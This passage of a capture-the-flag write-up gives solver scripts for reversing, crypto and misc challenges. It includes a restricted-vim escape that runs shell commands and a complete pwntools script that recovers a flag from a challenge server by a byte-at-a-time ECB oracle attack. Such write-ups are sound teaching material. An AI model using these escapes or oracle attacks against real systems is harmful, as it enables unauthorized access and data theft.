    for ov2 in ptab:
        if found:
            break
        for ov3 in ptab:
            v2 = ov2
            v3 = ov3
            if found:
                break
            v6 = 0
            v8 = [67, 48, 82, 51]
            for j in range(32):
                v2 += (((v3 >> 5) ^ ((16 * v3)&0xffffffff)) + v3) ^ (v8[v6 & 3]) + v6
                v2 &= 0xffffffff
                v6 = (v6 + 0x1337DEAD)&0xffffffff
                v3 += (((v2 >> 5) ^ ((16 * v2)&0xffffffff)) + v2) ^ (v8[(v6 >> 11) & 3]) + v6
                v3 &= 0xffffffff
            if v2==tar[2*i] and v3==tar[2*i+1]:
                found = True
                f1[i] = ov2
                f1[4+i] = ov3
    if not found:
        print i,'not found'

f1 = ''.join(map(chr, f1))
print f1

tab = "*|-Ifnq20! \nAZd$r<Xo\\D/{KC~a4Tz7)Y^:x`\v}Ss1yOmiv#\r%]@[_N(Hj,VQug"
tar = "4`Q%A_A#T:Z%A/H}{%mSA[Q\v"
fbits = ''
for ch in tar:
    idx = tab.find(ch)
    fbits += bin(idx)[2:].rjust(6,'0')
f2 = hex(int(fbits,2))[2:].strip('L').decode('hex')
print f2

v17 = "Pl3as_d0n't_cR45h_1n_+h!s_fUnC+10n"
tar = pack('Q',0x14DD43A0935D552B)+pack('I',0xE57D5243)
v13 = range(246)
v7 = 0
for j in range(246):
    v7 = (ord(v17[j%34]) + v13[j] + v7) % 246
    v12 = v13[j]
    v13[j] = v13[v7]
    v13[v7] = v12
f3 = ''
v5 = 0
v8 = 0
for v10 in range(12):
    v5 = (v5+1)%246
    v8 = (v13[v5] + v8) % 246
    v11 = v13[v5]
    v13[v5] = v13[v8]
    v13[v8] = v11
    val = v13[(v13[v5] + v13[v8]) % 246]
    f3 += chr(ord(tar[v10])^val)
print f3
    
print 'hitcon{'+f0+f1+f2+f3+f4+'}'
```

### suicune  

It's developed using Crystal, a Ruby-like language, which causes the ELF file like a shit.  

I spent a lot of times on debuging and watching some data in runtime, finally the first version encrypt function was restored using python.  

```python
MAX_LONG = (1<<64)-1
class Rand:
    def __init__(self,append,value):
        self.append = append
        self.value = (value * 0x5851F42D4C957F2D + 0x5851F42D4C957F2E) & MAX_LONG
        self.wtf = 0x9e
    def get_rand(self):
        r = self.value
        self.value = (self.value * 0x5851F42D4C957F2D + self.append) & MAX_LONG
        tmp = ((r ^ (r >> 18))>>27)&((1<<32)-1)
        offset = r >> 59
        return (tmp>>offset)|((tmp&((1<<offset)-1))<<(32-offset))

def encrypt(flag,key):
    rand = Rand(1,key)
    def shift(t):
        for i in range(len(t)-1,0,-1):
            v = rand.get_rand()%(i+1)
            t[v],t[i] = t[i],t[v]
        return t
    def get_table(length):
        table = [x for x in range(0x100)]
        table = shift(table)
        rand.get_rand()
        rand.get_rand()
        tmp = table[:length]
        tmp.sort()
        return tmp[::-1]
    s1 = flag
    for i in range(0x10):
        s2 = get_table(len(s1))
        data = "".join([chr(ord(x)^y) for x,y in zip(s1,s2)])
        s1 = data[::-1]
    return s1.encode("hex")

print encrypt("aaabbbccc",1234)
```  
It was not hard to reverse, and we can bruteforce the plaintext because the key is just a 16 bit integer.  

BUT, I couldn't find any flag when feeding the ciphertext. Something went wrong, although the ciphertext I simulated was as same as the output of suicune. Then I realised the last two random values was not used in `get_table`. I reopend IDA and located the reference of the last two random values. They were combined as a int64 as a loop counts. When I reverse these code at first time, I knew it's a sort algorithm, so I quickly ignored some details. Now it was time to figure out how it really works.  

Finally this stupid sort algorithm was exposed. It seems very similar to bubble sort. At first it starts from the last, exchanges two numbers if the front is bigger than the back. But a stupid operation is excuted here. It will reverse the ordered sequence between the current iteration and the end. Then go back to begining until the entire sequence is ordered or the loop times equals the random value.  

When the length of plaintext is small, the ranom value is enough to sort the table. However, the sort algorithm may be break earily because the loop rounds is bigger than the random value if the input is long. So we need the exactly status of table at each loop rounds, it's easy to make it using recursive algorithm.  

```C
uint64_t lazy_sort_step[] = {0x0,
    0x0000000000000001-1,0x0000000000000002-1,
    0x0000000000000006-1,0x0000000000000018-1,
    0x0000000000000078-1,0x00000000000002d0-1,
    0x00000000000013b0-1,0x0000000000009d80-1,
    0x0000000000058980-1,0x0000000000375f00-1,
    0x0000000002611500-1,0x000000001c8cfc00-1,
    0x000000017328cc00-1,0x000000144c3b2800-1,
    0x0000013077775800-1,0x0000130777758000-1,
    0x0001437eeecd8000-1,0x0016beecca730000-1,
    0x01b02b9306890000-1,0x21c3677c82b40000-1,
    0xffffffffffffffff,0xffffffffffffffff,
};
uint64_t calc_array_status(uint8_t* data,int length,uint64_t count){
    uint64_t cost = 0;
    uint64_t tmp_cost=0;
    for(int j=length-2;count > 0 && j>=0;j--){
        if(data[j+1]>data[j]){
            int iter = length-1;
            while(iter>j){
                //find the first bigger than data[j]
                if( data[iter] > data[j])
                    break;
                iter--;
            }
            for(; count && iter > j;iter--){
                count--;
                cost++;
                uint8_t tmp = data[j];
                data[j] = data[iter];
                data[iter] = tmp;
                if(count > lazy_sort_step[length-j-1]){
                    //ok
                    count -= lazy_sort_step[length-j-1];
                    cost += lazy_sort_step[length-j-1];
                }else{
                    uint8_t ex_buffer[0x100];
                    memcpy(ex_buffer,&data[j+1],length-1-j);
                    for(int tmp_i = 0;tmp_i<length-j-1;tmp_i++){
                        data[tmp_i+j+1] = ex_buffer[length-j-2-tmp_i];
                    }
                    tmp_cost = calc_array_status(&data[j+1],length-j-1,count);
                    cost += tmp_cost;
                    count -= tmp_cost;
                }
            }
        }
    }
    return cost;
}
```

Finally figure the correct table status and bruteforce the key to get flag.

### EV3 Arm

This website [http://ev3treevis.azurewebsites.net/](http://ev3treevis.azurewebsites.net/) can dump the robot actions as readable text. 

The video show the mapping between the dumped action text and the robot arms. So we can jump simulate the robot arm's action and get the flag.

## Crypto

### Very Simple Haskell

In this task, we are given a haskell program which computer the magic number of the input string and the magic output of flag. The length of unknown bytes is only 6 and only inside middle of the three 131-bit blocks. Follow the computation we need to compute the square root of a number module large composite `N`, which is hard to solve. But according to the padding the var `mul` at this step should be small relatively. and we managed to recover the `pow(mul,2,N)` which is factorable since it does not overlap `N`. 

All used scripts during solving is provided below, while interactive shell part not saved.

```python
from Crypto.Util.number import *

pp = []
for i in range(2,1000):
    if isPrime(i):
        pp.append(i)

n = 134896036104102133446208954973118530800743044711419303630456535295204304771800100892609593430702833309387082353959992161865438523195671760946142657809228938824313865760630832980160727407084204864544706387890655083179518455155520501821681606874346463698215916627632418223019328444607858743434475109717014763667
k = 131
pp = pp[:k]
print pp

a = '1234567890'
a = 'the flag is hitcon{aaaaaa}'

def extendbits(num,bits):
    pad = num-len(bits)%num
    if pad!=num:
        return '0'*pad+bits
    else:
        return bits

def calc(num, bits):
    assert len(bits)%k==0
    for i in xrange(0, len(bits), k):
        num2 = pow(num,2,n)
        blk = map(int, bits[i:i+k])
        z = map(lambda (x,y):x*y,zip(blk,pp))
        mul = reduce(lambda x,y:x*y, filter(lambda x:x!=0, z))
        print i, num2, mul
        num = num2*mul%n
    return num

def magic(a):
    anum = int(a.encode('hex'),16)
    abits = bin(anum)[2:]
    abits = extendbits(8, abits)
    ebits = abits[::-1]
    olen = len(ebits)
    obits = bin(olen)[2:]
    ebits = extendbits(k, ebits)
    obits = extendbits(k, obits)
    fbits = obits + ebits
    fbits = fbits[::-1]
    print fbits[:131]
    print fbits[131:262]
    print fbits[262:393]
    return calc(1, fbits)

print magic(a)

# copy from factordb but factorization should also work locally
fs = [3 ,5 ,7 ,11 ,17 ,19 ,29 ,31 ,37 ,47 ,53 ,59 ,61 ,71 ,73 ,83 ,89 ,97 ,103 ,107 ,127 ,173 ,197 ,223 ,227 ,229 ,233 ,239 ,257 ,283 ,311 ,337 ,347 ,353 ,359 ,367 ,373 ,379 ,389]
abits = ''
for i in xrange(k):
    if pp[i] in fs:
        abits += '1'
    else:
        abits += '0'
print abits
ans = ''
for i in range(5,len(abits),8):
    ans += chr(int(abits[i:i+8],2))
print ans

```

### Lost Modulus Again

In this challenge, we are given the value of `e, n(d), x(iqmp), y(ipmq)`. After some local tests, we find that `gcdext(p, q) = (1, y - q, x)`, which means `p(y-q)+qx=1`. And we also know that `ed=1+kpq` and `k<e`, so just bruteforce `k` and solve two equations.

### not so hard RSA

Unintended solution :)
As Section 4.4 in this [paper](https://pdfs.semanticscholar.org/2d85/9e8937fe652558a60e82ffd39cd4ab835e31.pdf), we can build a lattice and use LLL algorithm to recover `d`. However, in this task, we have only 10 public keys, and the `d` is 465 bits, which exceeds the upper bound of this method, so the result is not precise. But this can be improved with Babai's algorithm, after some analysis, I noticed that each item in the target vector, known as the "small" bias is around 976 bits. Thus, just choose them randomly from [2\*\*976, 2\*\*975, 2\*\*974, 2\*\*973] each time, after about 10 minutes on my laptop, I got the correct answer.


## Misc

### Welcome

Connect to the ssh server will start a vim session. I just use `:!` to execute shell command and get the flag. 

### EV3 Player

Same to the last year lego challenge. After analysis the network traffic, we can dump two music that can only played by lego sdk enviroment. The first music tell use the flag format and the second just speak out the flag.

### Revenge of Welcome

Similar to challenge `Welcome` but we are inside insert mode and cannot run command directly. After googling things like `vim execute command in insert mode` it's quite easy to figure out `ctrl-o` is what we need. Executing `:q` and it will print the flag.

### EmojiVM

For this challenge, we are supposed to print 9x9 multiplication table using this emojivm, and the length of your program is limited to 2000 bytes. I use 3 global buffers to store constant strings (`' * ',' = ','\n'`) for later output and another buffer to save local loop variables. The remaining work is only to construct conditional jump like writing assembly. A two-dimensional loop is enough for this task. 
The code with basic comments is listed below

```python
dd = {'and': 7, 'show': 20, 'jnz': 11, 'pop': 14, 'lessthan': 8, 'push_g': 15, 'xor': 6, 'add': 2, 'exit': 23, 'new': 17, 'jmp': 10, 'jz': 12, 'pop_g': 16, 'nop': 1, 'mult': 4, 'mod': 5, 'edit': 19, 'wcout': 22, 'push': 13, 'cmp': 9, 'show_stack': 21, 'minus': 3, 'delete': 18}

cmds = {1: '\xf0\x9f\x88\xb3', 2: '\xe2\x9e\x95', 3: '\xe2\x9e\x96', 4: '\xe2\x9d\x8c', 5: '\xe2\x9d\x93', 6: '\xe2\x9d\x8e', 7: '\xf0\x9f\x91\xab', 8: '\xf0\x9f\x92\x80', 9: '\xf0\x9f\x92\xaf', 10: '\xf0\x9f\x9a\x80', 11: '\xf0\x9f\x88\xb6', 12: '\xf0\x9f\x88\x9a', 13: '\xe2\x8f\xac', 14: '\xf0\x9f\x94\x9d', 15: '\xf0\x9f\x93\xa4', 16: '\xf0\x9f\x93\xa5', 17: '\xf0\x9f\x86\x95', 18: '\xf0\x9f\x86\x93', 19: '\xf0\x9f\x93\x84', 20: '\xf0\x9f\x93\x9d', 21: '\xf0\x9f\x94\xa1', 22: '\xf0\x9f\x94\xa2', 23: '\xf0\x9f\x9b\x91'}
nums = {0: '\xf0\x9f\x98\x80', 1: '\xf0\x9f\x98\x81', 2: '\xf0\x9f\x98\x82', 3: '\xf0\x9f\xa4\xa3', 4: '\xf0\x9f\x98\x9c', 5: '\xf0\x9f\x98\x84', 6: '\xf0\x9f\x98\x85', 7: '\xf0\x9f\x98\x86', 8: '\xf0\x9f\x98\x89', 9: '\xf0\x9f\x98\x8a', 10: '\xf0\x9f\x98\x8d'}

prog = ''
# new buffer
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['new']] # *
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['new']] # =
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['new']] # \n
prog += cmds[dd['push']]
prog += nums[5]
prog += cmds[dd['new']] # local var

#prepare char
prog += cmds[dd['push']]
prog += nums[10]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[2]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[6]
prog += cmds[dd['push']]
prog += nums[7]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[2]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[7]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[5]
prog += cmds[dd['add']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['pop_g']]

prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[8]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[2]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['pop_g']]


# prepare loop
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['pop_g']] # i

prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['pop_g']] # j


# loop output
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['wcout']]

prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['show']]

prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['wcout']]

prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['show']]

prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['mult']]
prog += cmds[dd['wcout']]

prog += cmds[dd['push']]
prog += nums[2]
prog += cmds[dd['show']]

# add j
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['add']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['pop_g']]

# check j
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['push']]
prog += nums[10]
prog += cmds[dd['cmp']]
prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[6]
prog += cmds[dd['mult']]
prog += cmds[dd['mult']] # 0x60
prog += cmds[dd['jz']]

# add i
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['push']]
prog += nums[1]
prog += cmds[dd['add']]
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['pop_g']]

# check i
prog += cmds[dd['push']]
prog += nums[0]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push_g']]
prog += cmds[dd['push']]
prog += nums[10]
prog += cmds[dd['cmp']]
prog += cmds[dd['push']]
prog += nums[3]
prog += cmds[dd['push']]
prog += nums[4]
prog += cmds[dd['push']]
prog += nums[7]
prog += cmds[dd['mult']]
prog += cmds[dd['mult']]
prog += cmds[dd['push']]
prog += nums[5]
prog += cmds[dd['add']] # 0x59
prog += cmds[dd['jz']]

prog += cmds[dd['exit']]


f = open('prog','wb')
f.write(prog)
f.close()
```

### heXDump

This should be a baby Crypto challenge. In ECB mode, same plain text will be encrypted into same cipher text. So just over write the first N - 1 bytes of flag as `\x00`, then try all possible value of the last byte, if we get the same cipher text, it should be the correct one. 

```python
from pwn import *

def write(p, x):
	p.recvuntil('0) quit\n')
	p.sendline('1')
	p.recvuntil('(In hex format)\n')
	p.sendline(x)
	return

def read(p):
	p.recvuntil('0) quit\n')
	p.sendline('2')
	return p.recvuntil('\n', True)

def change(p):
	p.recvuntil('0) quit\n')
	p.sendline('3')
	p.recvuntil('- AES\n')
	p.sendline('aes')
	return

def secret(p):
	p.recvuntil('0) quit\n')
	p.sendline('1337')


flag = ''
l = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~'
for i in range(len(flag), 16):
	p = remote('13.113.205.160', 21700)
	change(p)
	secret(p)
	write(p, '00' * (15 - i))
	oracle = read(p)[:32]
	print oracle
	p.close()
	find = 0
	idx = 0
	while not find:
		p = remote('13.113.205.160', 21700)
		print 'try idx %d' %idx
		change(p)
		for _ in range(idx, len(l)):
			try:
				write(p, '00' * (15 - i) + (l[_] + flag).encode('hex'))
				idx += 1
				if read(p)[:32] == oracle:
					print 'ok'
					flag = l[_] + flag
					print flag
					find = 1
					break
				print "=="
			except:
				if find == 0:
					idx = _
				p.close()
				break

print flag

flag2 = '}\x0a'
l = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^`{|}~'
for i in range(len(flag2), 16):
	p = remote('13.113.205.160', 21700)
	change(p)
	secret(p)
	write(p, '00' * (15 + 16 - i))
	oracle = read(p)[32:]
	print oracle
	p.close()
	find = 0
	idx = 0
	while not find:
		p = remote('13.113.205.160', 21700)
		print 'try idx %d' %idx
		change(p)
		for _ in range(0, len(l)):
			try:
				write(p, '00' * (15 + 16 - i) + (l[_] + flag2).encode('hex'))
				idx += 1
				if read(p)[32 : 32 + len(oracle)] == oracle:
					print 'ok'
					flag2 = l[_] + flag2
					print flag2
					find = 1
					break
				print "=="
			except:
				if find == 0:
					idx = _
				p.close()
				break
print flag + flag2	
#hitcon{xxd?XDD!ed45dc4df7d0b79}
```
